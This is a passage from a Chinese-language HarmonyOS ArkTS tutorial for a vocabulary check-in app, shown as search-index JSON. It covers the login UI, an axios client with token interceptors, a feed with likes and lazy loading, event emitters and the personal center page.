})\n        }.margin({ top: 30 })\n\n        Divider()\n          .color(Color.Black)\n\n        Row() {\n          Image($r(\"app.media.ic_code\"))\n            .iconStyle()\n          TextInput({ placeholder: '\u8bf7\u8f93\u5165\u9a8c\u8bc1\u7801',text:this.code })\n            .inputStyle()\n            .onChange((value)=&gt;{\n              this.code=value;\n            })\n          Button('\u83b7\u53d6\u9a8c\u8bc1\u7801')\n            .buttonStyle(Color.White, Color.Black)\n            .onClick(() =&gt; {\n              //todo:\u83b7\u53d6\u9a8c\u8bc1\u7801\n            })\n\n        }.margin({ top: 20 })\n\n        Divider()\n          .margin({ right: 120 })\n          .color(Color.Black)\n\n        Button('\u7acb\u5373\u767b\u5f55')\n          .buttonStyle(Color.Black, Color.White)\n          .width('100%')\n          .margin({ top: 50 })\n          .onClick(() =&gt; {\n            //todo:\u767b\u5f55\n          })\n\n        Row() {\n          Text('\u767b\u5f55\u5373\u8868\u793a\u5df2\u540c\u610f')\n            .fontSize(10)\n            .fontColor('#546B9D')\n          Text('\u300a\u7528\u6237\u4f7f\u7528\u534f\u8bae\u300b')\n            .fontSize(10)\n            .fontColor('#00B3FF')\n        }.margin({ top: 20 })\n      }.formBgStyle()\n\n      Row({ space: 10 }) {\n        Image($r('app.media.ic_logo'))\n          .width(36)\n          .height(36)\n        Text('\u5feb\u901f\u8bb0\u5355\u8bcd\u795e\u5668')\n          .fontColor('#546B9D')\n          .fontWeight(FontWeight.Bold)\n          .fontSize(20)\n      }.margin({ top: 70 })\n\n      Text('Developed By Atguigu')\n        .fontSize(12)\n        .fontColor('#546B9D')\n        .margin(10)\n\n    }\n    .loginBgStyle()\n  }\n}\n\n@Styles function loginBgStyle() {\n  .width('100%')\n  .height('100%')\n  .backgroundImage($r(\"app.media.img_login_bg\"))\n  .backgroundImageSize({ width: '100%', height: '100%' })\n  .padding({\n    top: 30, bottom: 30, left: 20, right: 20\n  })\n}\n\n@Styles function backStyle() {\n  .width(25)\n  .height(25)\n}\n\n@Styles function formBgStyle() {\n  .backgroundColor(Color.White)\n  .padding(30)\n  .borderRadius(20)\n}\n\n@Extend(Text) function titleStyle() {\n  .fontWeight(FontWeight.Bold)\n  .fontSize(22)\n}\n\n@Styles function iconStyle() {\n  .width(24)\n  .height(24)\n}\n\n@Extend(TextInput) function inputStyle() {\n  .height(40)\n  .layoutWeight(1)\n  .fontSize(14)\n  .backgroundColor(Color.Transparent)\n}\n\n@Extend(Button) function buttonStyle(bgColor: ResourceColor, fontColor: ResourceColor) {\n  .type(ButtonType.Normal)\n  .fontSize(14)\n  .fontWeight(FontWeight.Medium)\n  .borderWidth(1)\n  .borderRadius(5)\n  .backgroundColor(bgColor)\n  .fontColor(fontColor)\n}\n</code></pre>"},{"location":"JS/test/#5222","title":"5.2.2.2. \u5bf9\u63a5\u540e\u53f0\u63a5\u53e3","text":"<p>\u7b2c\u4e00\u6b65\uff1a\u6dfb\u52a0axios\u4f9d\u8d56</p> <p>\u5728\u7ec8\u7aef\u6267\u884c\u5982\u4e0b\u547d\u4ee4</p> <pre><code>ohpm install @ohos/axios\n</code></pre> <p>\u7b2c\u4e8c\u6b65\uff1a\u521b\u5efaaxios\u5b9e\u4f8b</p> <pre><code>import axios, { AxiosError, AxiosResponse, InternalAxiosRequestConfig } from '@ohos/axios'\nimport promptAction from '@ohos.promptAction';\n\n//\u521b\u5efaaxios\u5b9e\u4f8b\nexport const instance = axios.create({\n  baseURL: 'http://xxx.xxx.xxx.xxx:3000',\n  timeout: 2000\n})\n\n// \u6dfb\u52a0\u8bf7\u6c42\u62e6\u622a\u5668\ninstance.interceptors.request.use((config: InternalAxiosRequestConfig) =&gt; {\n  // \u901a\u8fc7AppStorage\u83b7\u53d6token\n  const token = AppStorage.Get('token')\n  if (token) {\n    // \u82e5token\u5b58\u5728\uff0c\u5219\u5c06\u5176\u6dfb\u52a0\u5230\u8bf7\u6c42\u5934\n    config.headers['token'] = token\n  }\n  return config;\n}, (error: AxiosError) =&gt; {\n  //\u82e5\u51fa\u73b0\u5f02\u5e38\uff0c\u5219\u63d0\u793a\u5f02\u5e38\u4fe1\u606f\n  promptAction.showToast({ message: error.message })\n  return Promise.reject(error);\n});\n\n// \u6dfb\u52a0\u54cd\u5e94\u62e6\u622a\u5668\ninstance.interceptors.response.use((response: AxiosResponse) =&gt; {\n  // \u82e5\u670d\u52a1\u5668\u8fd4\u56de\u7684\u662f\u6b63\u5e38\u6570\u636e\uff0c\u4e0d\u505a\u4efb\u4f55\u5904\u7406\n  if (response.data.code === 200) {\n    return response\n  } else {\n    //\u82e5\u670d\u52a1\u5668\u8fd4\u56de\u7684\u662f\u5f02\u5e38\u6570\u636e\uff0c\u5219\u63d0\u793a\u5f02\u5e38\u4fe1\u606f\n    promptAction.showToast({ message: response.data.message })\n    return Promise.reject(response.data.message)\n  }\n}, (error: AxiosError) =&gt; {\n  //\u82e5\u51fa\u73b0\u5f02\u5e38\uff0c\u5219\u63d0\u793a\u5f02\u5e38\u4fe1\u606f\n  promptAction.showToast({ message: error.message })\n  return Promise.reject(error);\n});\n</code></pre> <p>\u7b2c\u4e09\u6b65\uff1a\u5bf9\u63a5\u540e\u53f0\u63a5\u53e3</p> <p>\u767b\u5f55\u529f\u80fd\u9700\u8981\u5bf9\u63a5\u4e24\u4e2a\u540e\u53f0\u63a5\u53e3\uff0c\u5206\u522b\u662f\u83b7\u53d6\u9a8c\u8bc1\u7801\u548c\u767b\u5f55</p> <pre><code>//\u83b7\u53d6\u9a8c\u8bc1\u7801\nexport function sendCode(phone: string) {\n  return instance.get('/word/user/code', { params: { phone: phone } });\n}\n\n//\u767b\u5f55\nexport function login(phone: string, code: string) {\n  return instance.post('/word/user/login', { phone: phone, code: code });\n}\n</code></pre> <p>\u6ce8\u610f\uff1a\u9700\u8981\u914d\u7f6e\u7f51\u7edc\u8bbf\u95ee\u6743\u9650</p>"},{"location":"JS/test/#5223","title":"5.2.2.3. \u5b9e\u73b0\u767b\u5f55\u903b\u8f91","text":"<p>\u767b\u5f55\u903b\u8f91\u76f8\u5bf9\u7b80\u5355\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\u767b\u5f55\u6210\u529f\u540e\uff0c\u5e94\u5c06token\u4fdd\u5b58\u81f3PersistentStorage\u4e2d\uff0c\u5e76\u8fd4\u56de\u4e0a\u4e00\u9875\u9762\u3002</p>"},{"location":"JS/test/#6","title":"6. \u6253\u5361\u529f\u80fd","text":""},{"location":"JS/test/#61","title":"6.1. \u6982\u8ff0","text":"<p>\u5b8c\u6210\u767b\u5f55\u529f\u80fd\u540e\uff0c\u4fbf\u53ef\u5b9e\u73b0\u7b54\u9898\u7ed3\u675f\u540e\u7684\u6253\u5361\u529f\u80fd\u3002</p> <p></p> <p>\u7ed3\u679c\u5f39\u7a97\u4e2d\uff0c\u5e94\u8be5\u6839\u636e\u5f53\u524d\u7684\u767b\u5f55\u72b6\u6001\u663e\u793a\u4e0d\u540c\u7684\u6253\u5361\u6309\u94ae\uff0c\u82e5\u4e3a\u767b\u5f55\u72b6\u6001\u5e94\u663e\u793a\u7acb\u5373\u6253\u5361\uff0c\u5426\u5219\u663e\u793a\u767b\u5f55\u6253\u5361\u3002</p> <p>\u70b9\u51fb\u7acb\u5373\u6253\u5361\uff0c\u5e94\u76f4\u63a5\u53d1\u9001\u6253\u5361\u8bf7\u6c42\u5e76\u8df3\u8f6c\u5230\u6253\u5361\u5708\uff0c\u5177\u4f53\u6d41\u7a0b\u5982\u4e0b\u56fe\u6240\u793a</p> <p></p> <p>\u70b9\u51fb\u767b\u5f55\u6253\u5361\uff0c\u5e94\u5148\u8df3\u8f6c\u5230\u767b\u5f55\u9875\u9762\uff0c\u767b\u5f55\u6210\u529f\u540e\uff0c\u518d\u53d1\u9001\u6253\u5361\u8bf7\u6c42\uff0c\u5e76\u8df3\u8f6c\u5230\u6253\u5361\u5708\uff0c\u5177\u4f53\u6d41\u7a0b\u5982\u4e0b\u56fe\u6240\u793a</p> <p></p>"},{"location":"JS/test/#62","title":"6.2. \u5b9e\u73b0\u601d\u8def","text":""},{"location":"JS/test/#621","title":"6.2.1. \u9875\u9762\u8df3\u8f6c\u903b\u8f91","text":"<p>\u9996\u5148\u6309\u7167\u4e0a\u8ff0\u8981\u6c42\u5b9e\u73b0\u9875\u9762\u7684\u8df3\u8f6c\u903b\u8f91\u3002</p>"},{"location":"JS/test/#622","title":"6.2.2. \u5bf9\u63a5\u540e\u53f0\u63a5\u53e3","text":"<pre><code>export function createPost(post: {\n  rightCount: number,\n  answeredCount: number,\n  timeUsed: number\n}) {\n  return instance.post('/word/post/create', post)\n}\n</code></pre>"},{"location":"JS/test/#7","title":"7. \u6253\u5361\u5708\u9875\u9762","text":""},{"location":"JS/test/#71","title":"7.1. \u6982\u8ff0","text":"<p>\u6253\u5361\u5708\u7528\u4e8e\u5c55\u793a\u5168\u90e8\u7528\u6237\u7684\u6253\u5361\u8bb0\u5f55\uff0c\u5e76\u63d0\u4f9b\u70b9\u8d5e\u529f\u80fd\u3002</p> <p></p>"},{"location":"JS/test/#72","title":"7.2. \u5b9e\u73b0\u601d\u8def","text":""},{"location":"JS/test/#721","title":"7.2.1. \u5b9a\u4e49\u6253\u5361\u5217\u8868\u72b6\u6001\u53d8\u91cf","text":"<p>\u670d\u52a1\u7aef\u8fd4\u56de\u7684\u6253\u5361\u4fe1\u606f\u7ed3\u6784\u5982\u4e0b\uff1a</p> <pre><code>{\n  \"id\": 0,\n  \"postText\": \"string\", //\u6253\u5361\u6587\u6848\n  \"rightCount\": 0, //\u6b63\u786e\u4e2a\u6570\n  \"answeredCount\": 0, //\u7b54\u9898\u4e2a\u6570\n  \"timeUsed\": 0, //\u7528\u65f6\n  \"createTime\": \"string\", //\u6253\u5361\u65f6\u95f4\n  \"likeCount\": 0, //\u70b9\u8d5e\u4e2a\u6570\n  \"nickname\": \"string\", //\u7528\u6237\u6635\u79f0\n  \"avatarUrl\": \"string\", //\u7528\u6237\u5934\u50cf\n  \"isLike\": true //\u5f53\u524d\u767b\u5f55\u7528\u6237\u662f\u5426\u5df2\u70b9\u8d5e\n}\n</code></pre> <p><code>isLike</code>\u5c5e\u6027\u8868\u793a\u5f53\u524d\u7528\u6237\u662f\u5426\u5df2\u70b9\u8d5e\uff0c\u6211\u4eec\u9700\u8981\u6839\u636e\u8be5\u5c5e\u6027\u663e\u793a\u4e0d\u540c\u989c\u8272\u7684\u70b9\u8d5e\u56fe\u6807\uff0c\u5982\u4e0b</p> <code>**isLike=true**</code> <code>**isLike=false**</code> <p>\u5f53\u7528\u6237\u6267\u884c\u70b9\u8d5e\u6216\u8005\u53d6\u6d88\u70b9\u8d5e\u7684\u64cd\u4f5c\u65f6\uff0c\u53ea\u9700\u4fee\u6539<code>isLike</code>\u7684\u503c\uff0c\u5c31\u80fd\u5b9e\u73b0\u56fe\u6807\u989c\u8272\u7684\u5207\u6362\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6211\u4eec\u4f1a\u4f7f\u7528\u4e00\u4e2a\u6570\u7ec4\u4fdd\u5b58\u6253\u5361\u8bb0\u5f55\u5217\u8868\uff0c\u800c<code>isLike</code>\u662f\u6570\u7ec4\u5143\u7d20\u7684\u5c5e\u6027\u3002\u524d\u6587\u63d0\u5230\u8fc7\u76f4\u63a5\u4fee\u6539\u6570\u7ec4\u5143\u7d20\u7684\u5c5e\u6027\uff0c\u6846\u67b6\u662f\u89c2\u5bdf\u4e0d\u5230\u7684\uff0c\u56e0\u6b64\u6211\u4eec\u9700\u8981\u5c06\u6253\u5361\u8bb0\u5f55\u4f5c\u4e3a\u4e00\u4e2a\u5b50\u7ec4\u4ef6\uff0c\u7136\u540e\u5c06\u6253\u5361\u8bb0\u5f55\u4f5c\u4e3a\u8be5\u7ec4\u4ef6\u7684\u4e00\u4e2a\u5c5e\u6027\uff0c\u5e76\u4e14\u8be5\u5c5e\u6027\u9700\u8981\u4f7f\u7528<code>@ObjectLink</code>\u88c5\u9970\uff0c\u53e6\u5916\u6253\u5361\u8bb0\u5f55\u7684\u7c7b\u578b\u9700\u8981\u662f\u4e00\u4e2aclass\uff0c\u5e76\u4e14\u8be5class\u9700\u8981\u4f7f\u7528<code>@Observed</code>\u88c5\u9970\uff0c\u8be5class\u7684\u5b9a\u4e49\u5982\u4e0b</p> <pre><code>@Observed\nexport class PostInfo {\n  id: number;\n  postText: string;\n  rightCount: number;\n  answeredCount: number;\n  timeUsed: number;\n  createTime: string;\n  likeCount: number;\n  nickname: string;\n  avatarUrl: string\n  isLike: boolean;\n\n  constructor(post:{id: number, postText: string, rightCount: number, answeredCount: number, timeUsed: number, createTime: string, likeCount: number, nickname: string, avatarUrl: string, isLike: boolean}) {\n    this.id = post.id;\n    this.postText = post.postText;\n    this.rightCount = post.rightCount;\n    this.answeredCount = post.answeredCount;\n    this.timeUsed = post.timeUsed;\n    this.createTime = post.createTime;\n    this.likeCount = post.likeCount;\n    this.nickname = post.nickname;\n    this.avatarUrl = post.avatarUrl;\n    this.isLike = post.isLike;\n  }\n}\n</code></pre> <p>\u6253\u5361\u4fe1\u606f\u6570\u7ec4\u7684\u5b9a\u4e49\u5982\u4e0b\uff1a</p> <pre><code>@State postInfoList: PostInfo[] = []\n</code></pre>"},{"location":"JS/test/#722","title":"7.2.2. \u57fa\u672c\u5e03\u5c40\u548c\u6837\u5f0f","text":"<p>\u4e3a\u65b9\u4fbf\u540e\u5e8f\u5e03\u5c40\u548c\u6837\u5f0f\u7684\u5f00\u53d1\uff0c\u53ef\u5148\u5728<code>postInfoList</code>\u6570\u7ec4\u6dfb\u52a0\u4e00\u4e2a\u6d4b\u8bd5\u5143\u7d20\uff0c\u5982\u4e0b</p> <pre><code>@State postInfoList: PostInfo[] = [new PostInfo({\n  id: 1,\n  postText: \"\u65e2\u7136\u9009\u62e9\u8fdc\u65b9\uff0c\u5f53\u4e0d\u8d1f\u9752\u6625\uff0c\u7825\u783a\u524d\u884c\",\n  rightCount: 3,\n  answeredCount: 4,\n  timeUsed: 5747,\n  createTime: \"2024-03-19 18:54:33\",\n  likeCount: 1,\n  nickname: \"138****8888\",\n  avatarUrl: \"https://oss.aliyuncs.com/aliyun_id_photo_bucket/default_handsome.jpg\",\n  isLike: false\n})]\n</code></pre> <p>\u6253\u5361\u5708\u8981\u6c42\u7528\u6237\u767b\u5f55\u540e\u624d\u53ef\u8bbf\u95ee\uff0c\u56e0\u6b64\u9700\u8981\u6839\u636e\u767b\u5f55\u72b6\u6001\u663e\u793a\u4e0d\u540c\u7684\u5185\u5bb9\uff0c\u5982\u4e0b</p> \u672a\u767b\u5f55 \u5df2\u767b\u5f55 <p>\u767b\u5f55\u72b6\u6001\u53ef\u6839\u636etoken\u8fdb\u884c\u5224\u65ad</p> <pre><code>@StorageProp('token') token: string = ''\n</code></pre> <p>\u8be5\u9875\u9762\u7684\u4e3b\u4f53\u6846\u67b6\u53ef\u53c2\u8003\u5982\u4e0b\u4ee3\u7801</p> \u4ee3\u7801 \u6548\u679c <code>build() {  Column() {    Text('\u82f1\u8bed\u6253\u5361\u5708')      .fontSize(18)      .margin({ top: 45 })      .fontWeight(FontWeight.Bold)    Divider()      .color(Color.Black)      .margin({ left: 20, right: 20, top: 10 })     if (this.token) {      //todo:\u6253\u5361\u5217\u8868    } else {      //todo:\u672a\u767b\u5f55    }  }.height('100%')  .width('100%') }</code> <p>\u672a\u767b\u5f55\u72b6\u6001\u4e0b\u7684\u5185\u5bb9\u53ef\u53c2\u8003\u5982\u4e0b\u4ee3\u7801</p> \u4ee3\u7801 \u6548\u679c <code>@Builder unLoginBuilder() {  Column({ space: 30 }) {    Image($r(\"app.media.ic_unLogin_bg\"))      .width(177)      .height(177)     Text('\u672a\u767b\u5f55\u6682\u65e0\u6570\u636e')      .fontSize(14)      .fontColor('#999999')     Button('\u53bb\u767b\u5f55')      .fontColor(Color.White)      .fontSize(14)      .width(100)      .height(34)      .backgroundColor('#43C6A0')      .onClick(() =&gt; router.pushUrl({ url: 'pages/LoginPage' }))  }  .width('100%')  .layoutWeight(1)  .justifyContent(FlexAlign.Center) }</code> <p>\u767b\u5f55\u72b6\u6001\u4e0b\u7684\u5185\u5bb9\u53ef\u53c2\u8003\u5982\u4e0b\u4ee3\u7801</p> \u4ee3\u7801 \u6548\u679c <code>@Builder listBuilder() {  Stack() {    List() {      ForEach(this.postInfoList, (post) =&gt; {        ListItem() {          PostItem({ post: post })        }      })    }.width('100%')    .height('100%')    .alignListItem(ListItemAlign.Center)     Column({ space: 20 }) {      Button({ type: ButtonType.Circle }) {        Image($r('app.media.ic_top'))          .height(14)          .width(14)      }      .height(40)      .width(40)      .backgroundColor(Color.Black)      .opacity(0.5)      .onClick(() =&gt; {        //todo:\u8fd4\u56de\u9876\u90e8      })       Button({ type: ButtonType.Circle }) {        Image($r('app.media.ic_refresh'))          .height(14)          .width(14)      }      .height(40)      .width(40)      .backgroundColor(Color.Black)      .opacity(0.5)      .onClick(() =&gt; {        //todo:\u5237\u65b0      })    }    .offset({ x: -20, y: -50 })  }.width('100%')  .layoutWeight(1)  .alignContent(Alignment.BottomEnd) }</code> <code>@Component struct PostItem {  @ObjectLink post: PostInfo;   build() {    Column({ space: 10 }) {      Row({ space: 10 }) {        Image(this.post.avatarUrl)          .height(40)          .width(40)          .borderRadius(20)        Text(this.post.nickname)          .height(40)          .fontSize(14)          .fontWeight(FontWeight.Bold)        Blank()        Text(this.post.createTime)          .height(40)          .fontSize(14)          .fontColor('#999999')          .fontWeight(FontWeight.Medium)      }.width('100%')       Text(this.post.postText)        .width('100%')       Row() {        Column() {          StatItem({            icon: $r('app.media.ic_timer_white'),            name: '\u7528\u65f6',            fontColor: Color.White }) {            Text(convertMillisecondsToTime(this.post.timeUsed))              .statTextStyle()          }           StatItem({            icon: $r('app.media.ic_accuracy_white'),            name: '\u51c6\u786e\u7387',            fontColor: Color.White          }) {            Text((this.post.answeredCount === 0 ? 0 : this.post.rightCount / this.post.answeredCount * 100).toFixed(0) + '%')              .statTextStyle()          }           StatItem({            icon: $r('app.media.ic_count_white'),            name: '\u4e2a\u6570',            fontColor: Color.White          }) {            Text(this.post.answeredCount.toString())              .statTextStyle()          }        }        .padding(10)        .borderRadius(10)        .layoutWeight(1)        .backgroundImage($r('app.media.img_post_bg'))        .backgroundImageSize(ImageSize.Cover)         Column() {          Text(this.post.likeCount.toString())            .fontSize(12)            .fontWeight(FontWeight.Medium)            .fontColor(this.post.isLike ? '#3ECBA1' : '#000000')          Image(this.post.isLike ? $r('app.media.ic_post_like_selected') : $r('app.media.ic_post_like'))            .width(26)            .height(26)            .onClick(() =&gt; {              //todo\uff1a\u70b9\u8d5e/\u53d6\u6d88\u70b9\u8d5e            })        }.width(50)      }.width('100%')      .alignItems(VerticalAlign.Bottom)    }    .padding(10)    .width('90%')    .margin({ top: 10 })    .borderRadius(10)    .shadow({ radius: 20 })  } } @Extend(Text) function statTextStyle() {  .width(100)  .fontSize(16)  .textAlign(TextAlign.End)  .fontWeight(FontWeight.Medium)  .fontColor(Color.White) }</code>"},{"location":"JS/test/#723","title":"7.2.3. \u5bf9\u63a5\u540e\u53f0\u63a5\u53e3","text":"<p>\u6253\u5361\u5708\u5171\u9700\u5bf9\u63a5\u4e09\u4e2a\u63a5\u53e3\uff0c\u5206\u522b\u662f\u83b7\u53d6\u6253\u5361\u4fe1\u606f\u5217\u8868\u3001\u70b9\u8d5e\u3001\u53d6\u6d88\u70b9\u8d5e\uff0c\u5177\u4f53\u5185\u5bb9\u5982\u4e0b</p> <pre><code>//\u83b7\u53d6\u5168\u90e8\u6253\u5361\u5217\u8868\nexport function getAllPost(page: number, size: number) {\n  return instance.get('/word/post/getAll', { params: { page: page, size: size } })\n}\n\n//\u70b9\u8d5e\nexport function like(postId: number) {\n  return instance.get('/word/like/create', { params: { postId: postId } })\n}\n\n//\u53d6\u6d88\u70b9\u8d5e\nexport function cancelLike(postId: number) {\n  return instance.get('/word/like/cancel', { params: { postId: postId } })\n}\n</code></pre>"},{"location":"JS/test/#724","title":"7.2.4. \u5b8c\u6210\u52a0\u8f7d\u6570\u636e\u903b\u8f91","text":"<p>\u6253\u5361\u5217\u8868\u7684\u6570\u636e\u52a0\u8f7d\u65b9\u5f0f\u4e3a\u61d2\u52a0\u8f7d\uff0c\u8d77\u521d\u53ea\u4f1a\u52a0\u8f7d\u4e00\u9875\u6570\u636e\uff0c\u4e4b\u540e\u6bcf\u6b21\u6ed1\u52a8\u5230\u5217\u8868\u5e95\u90e8\u518d\u52a0\u8f7d\u4e0b\u4e00\u9875\uff0c\u5168\u90e8\u52a0\u8f7d\u5b8c\u6bd5\u540e\uff0c\u9700\u8981\u7ed9\u51fa\u63d0\u793a\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff1a</p> <p></p> <p>\u7b2c\u4e00\u9875\u6570\u636e\u7684\u52a0\u8f7d\u65f6\u673a\uff0c\u548c\u542f\u52a8\u5e94\u7528\u65f6\uff0c\u7528\u6237\u7684\u767b\u5f55\u72b6\u6001\u76f8\u5173\u3002\u5982\u679c\u542f\u52a8\u5e94\u7528\u65f6\uff0c\u5df2\u7ecf\u662f\u767b\u5f55\u72b6\u6001\uff0c\u90a3\u4e48\u5728CirclePage\u7ec4\u4ef6\u51fa\u73b0\u4e4b\u524d\u5c31\u9700\u8981\u52a0\u8f7d\u7b2c\u4e00\u9875\u6570\u636e\uff1b\u5982\u679c\u542f\u52a8\u5e94\u7528\u65f6\u4e0d\u662f\u767b\u5f55\u72b6\u6001\uff0c\u90a3\u5c31\u8981\u7b49\u5230\u7528\u6237\u767b\u5f55\u4e4b\u540e\u518d\u52a0\u8f7d\u7b2c\u4e00\u9875\u6570\u636e\u3002</p> <p>\u89e6\u5e95\u52a0\u8f7d\u903b\u8f91\u9700\u8981\u9700\u8981\u501f\u52a9List\u7ec4\u4ef6\u7684<code>onReachEnd()</code>\u4e8b\u4ef6\uff0c\u53e6\u5916\u9700\u8981\u5b9a\u4e49\u4e24\u4e2a\u53d8\u91cf\uff0c\u4e00\u662f<code>page</code>\uff0c\u8868\u793a\u4e0b\u6b21\u8981\u52a0\u8f7d\u7684\u9875\u6570\uff0c\u4e00\u662f<code>total</code>\uff0c\u8868\u793a\u603b\u8bb0\u5f55\u6570\uff0c\u7528\u4e8e\u5224\u65ad\u662f\u5426\u52a0\u8f7d\u5b8c\u6bd5\u3002</p>"},{"location":"JS/test/#725","title":"7.2.5. \u5b8c\u6210\u6253\u5361\u540e\u81ea\u52a8\u5237\u65b0\u903b\u8f91","text":"<p>\u6253\u5361\u5b8c\u6210\u540e\u4f1a\u81ea\u52a8\u8df3\u8f6c\u5230\u6253\u5361\u5708\uff0c\u6b64\u65f6\u9700\u8981\u81ea\u52a8\u5237\u65b0\u9875\u9762\u4ee5\u663e\u793a\u6700\u65b0\u6253\u5361\u5185\u5bb9\uff0c\u5177\u4f53\u6548\u679c\u5982\u4e0b</p> <p></p> <p>\u4e3a\u5b9e\u73b0\u8be5\u529f\u80fd\uff0c\u9700\u8981\u4ee4\u6253\u5361\u5708\u9875\u9762\u611f\u77e5\u5230\u6253\u5361\u4e8b\u4ef6\uff0c\u8fdb\u800c\u89e6\u53d1\u5237\u65b0\u903b\u8f91\u3002\u4e8b\u4ef6\u901a\u77e5\u53ef\u901a\u8fc7emitter\u5b9e\u73b0\uff0c\u5176\u5177\u4f53\u7528\u6cd5\u5982\u4e0b</p> <p>\u5bfc\u5165emitter\u6a21\u5757</p> <pre><code>import emitter from '@ohos.events.emitter';\n</code></pre> <p>\u53d1\u9001\u81ea\u5b9a\u4e49\u4e8b\u4ef6</p> <pre><code>let event = {\n    eventId: 1, //\u4e8b\u4ef6ID\uff0c\u6839\u636e\u4e1a\u52a1\u903b\u8f91\u81ea\u5b9a\u4e49\n    priority: emitter.EventPriority.LOW //\u4e8b\u4ef6\u4f18\u5148\u7ea7\n};\n\nlet eventData = {\n    data: {\n        \"content\": \"c\",\n        \"id\": 1,\n        \"isEmpty\": false,\n    }\n};\n\n// \u53d1\u9001eventId\u4e3a1\u7684\u4e8b\u4ef6\uff0c\u4e8b\u4ef6\u6570\u636e\u4e3aeventData\nemitter.emit(event, eventData);\n</code></pre> <p>\u8ba2\u9605\u81ea\u5b9a\u4e49\u4e8b\u4ef6</p> <pre><code>// \u5b9a\u4e49\u4e00\u4e2aeventId\u4e3a1\u7684\u4e8b\u4ef6\nlet event = {\n    eventId: 1\n};\n\n// \u6536\u5230eventId\u4e3a1\u7684\u4e8b\u4ef6\u540e\u6267\u884c\u8be5\u56de\u8c03\nlet callback = (eventData) =&gt; {\n    console.info('event callback');\n};\n\n// \u8ba2\u9605eventId\u4e3a1\u7684\u4e8b\u4ef6\nemitter.on(event, callback);\n</code></pre> <p>\u5237\u65b0\u89c6\u56fe\u53ef\u53c2\u8003\u5982\u4e0b\u4ee3\u7801</p> \u4ee3\u7801 \u6548\u679c <code>@Builder loadingBuilder() {  Column({ space: 15 }) {    Image($r('app.media.ic_loading'))      .width(30)      .height(30)    Text('\u52a0\u8f7d\u4e2d...')      .fontSize(16)      .fontWeight(FontWeight.Medium)      .fontColor('#7e8892')  }.width('100%')  .layoutWeight(1)  .justifyContent(FlexAlign.Center) }</code>"},{"location":"JS/test/#726","title":"7.2.6. \u5b8c\u6210\u70b9\u8d5e/\u53d6\u6d88\u70b9\u8d5e\u903b\u8f91","text":"<p>\u70b9\u8d5e\u548c\u53d6\u6d88\u70b9\u8d5e\u7684\u903b\u8f91\u76f8\u5bf9\u7b80\u5355\uff0c\u5f53\u64cd\u4f5c\u53d1\u751f\u65f6\uff0c\u9700\u8981\u4fee\u6539<code>isLike</code>\u548c<code>likeCount</code>\u4e24\u4e2a\u5c5e\u6027\uff0c\u5e76\u540c\u65f6\u5411\u540e\u53f0\u53d1\u9001\u70b9\u8d5e\u540e\u8005\u53d6\u6d88\u70b9\u8d5e\u7684\u8bf7\u6c42\u3002</p>"},{"location":"JS/test/#727","title":"7.2.7. \u5b8c\u6210\u56de\u5230\u9876\u90e8\u903b\u8f91","text":"<p>\u56de\u5230\u9876\u90e8\u7684\u903b\u8f91\u4e5f\u76f8\u5bf9\u7b80\u5355\uff0c\u53ea\u9700\u4e3aList\u7ec4\u4ef6\u7ed1\u5b9aScroller\uff0c\u7136\u540e\u8c03\u7528\u5176<code>scrollToIndex</code>\u65b9\u6cd5\u5373\u53ef\u3002</p>"},{"location":"JS/test/#728","title":"7.2.8. \u5b8c\u6210\u624b\u52a8\u5237\u65b0\u903b\u8f91","text":"<p>\u624b\u52a8\u5237\u65b0\u53ef\u4ee5\u590d\u7528\u524d\u6587\u81ea\u52a8\u5237\u65b0\u7684\u903b\u8f91\u3002</p>"},{"location":"JS/test/#8","title":"8. \u4e2a\u4eba\u4e2d\u5fc3\u9875\u9762","text":""},{"location":"JS/test/#81","title":"8.1. \u6982\u8ff0","text":"<p>\u4e2a\u4eba\u4e2d\u5fc3\u7684\u529f\u80fd\u6709\u767b\u5f55/\u53d6\u6d88\u767b\u5f55\u4ee5\u53ca\u67e5\u770b\u4e2a\u4eba\u6253\u5361\u8bb0\u5f55\uff0c\u4e0b\u56fe\u662f\u672a\u767b\u5f55\u548c\u767b\u5f55\u72b6\u6001</p> \u672a\u767b\u5f55 \u767b\u5f55 <p>\u4e0b\u56fe\u662f\u4e2a\u4eba\u6253\u5361\u8bb0\u5f55\u9875\u9762\uff0c\u9700\u8981\u6ce8\u610f\uff0c\u4e2a\u4eba\u6253\u5361\u8bb0\u5f55\u9700\u5728\u767b\u5f55\u72b6\u6001\u4e0b\u624d\u80fd\u8bbf\u95ee</p> <p></p>"},{"location":"JS/test/#82","title":"8.2. \u5b9e\u73b0\u601d\u8def","text":""},{"location":"JS/test/#821","title":"8.2.1. \u5bf9\u63a5\u540e\u53f0\u63a5\u53e3","text":"<p>\u4e2a\u4eba\u4e2d\u5fc3\u9700\u8981\u7684\u63a5\u53e3\u5171\u6709\u4e24\u4e2a\uff0c\u5982\u4e0b</p> <pre><code>//\u83b7\u53d6\u767b\u5f55\u7528\u6237\u4fe1\u606f\nexport function info() {\n  return instance.get('/word/user/info')\n}\n\n//\u83b7\u53d6\u6211\u7684\u767b\u5f55\u6253\u5361\u8bb0\u5f55\nexport function getMyPost(page: number, size: number) {\n  return instance.get('/word/post/getMine', { params: { page: page, size: size } })\n}\n</code></pre>"},{"location":"JS/test/#822","title":"8.2.2. \u5b8c\u6574\u4ee3\u7801","text":"<p>\u4e2a\u4eba\u4e2d\u5fc3</p> <pre><code>import router from '@ohos.router';\nimport promptAction from '@ohos.promptAction';\nimport { info } from '../http/Api';\n\n@Component\nexport struct MinePage {\n  @StorageLink('token') @Watch('onTokenChange') token: string = ''\n  @State userInfo: {\n    nickname?: string,\n    avatarUrl?: string\n  } = {};\n\n  async onTokenChange() {\n    if (this.token) {\n      let response = await info()\n      this.userInfo = response.data.data;\n    } else {\n      this.userInfo = {}\n    }\n  }\n\n  async aboutToAppear() {\n    if (this.token) {\n      let response = await info()\n      this.userInfo = response.data.data;\n    }\n  }\n\n  build() {\n    Stack() {\n      Column() {\n        Image(this.token ? this.userInfo.avatarUrl : $r('app.media.img_avatar'))\n          .width(100)\n          .height(100)\n          .borderRadius(50)\n          .margin({ top: 120 })\n          .onClick(() =&gt; {\n            router.pushUrl({ url: 'pages/LoginPage' })\n          })\n\n        Text(this.token ? this.userInfo.nickname : '\u6682\u672a\u767b\u5f55')\n          .fontSize(18)\n          .fontWeight(FontWeight.Bold)\n          .fontColor(Color.Black)\n          .margin({ top: 20 })\n\n        if (!this.token) {\n          